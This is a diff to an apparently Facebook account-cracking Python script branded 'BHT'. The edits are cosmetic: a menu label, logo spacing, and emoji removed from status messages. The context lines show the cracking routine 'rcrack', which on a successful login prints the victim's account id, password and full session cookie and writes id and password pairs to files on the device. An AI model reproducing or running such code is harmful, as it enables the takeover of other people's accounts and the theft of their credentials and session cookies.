@@ -41,7 +41,7 @@ def ud():
 def FD():
     os.system('clear')
     print(logo)
-    print('\x1b[1;33m [1] ENTER ')
+    print('\x1b[1;33m [1] START ')
     print(' [2] EXIT')
     opt = input('\n  \x1b[1;32m Choose option >>> ')
     if opt == '1':
@@ -173,7 +173,7 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo =                                          ("""   
- \033[93;1m  ____        _    _   _______ ______          __  __ 
+\033[93;1m  ____        _    _   _______ ______          __  __ 
 \033[1;32m |  _ \      | |  | | |__   __|  ____|   /\   |  \/  |
 \033[91;1m | |_) |_____| |__| |    | |  | |__     /  \  | \  / |
 \033[95;1m |  _ <______|  __  |    | |  |  __|   / /\ \ | |\/| |
@@ -345,7 +345,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(BHT-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(BHT-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/BHT-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -353,7 +353,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(BHT-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(BHT-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/BHT-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
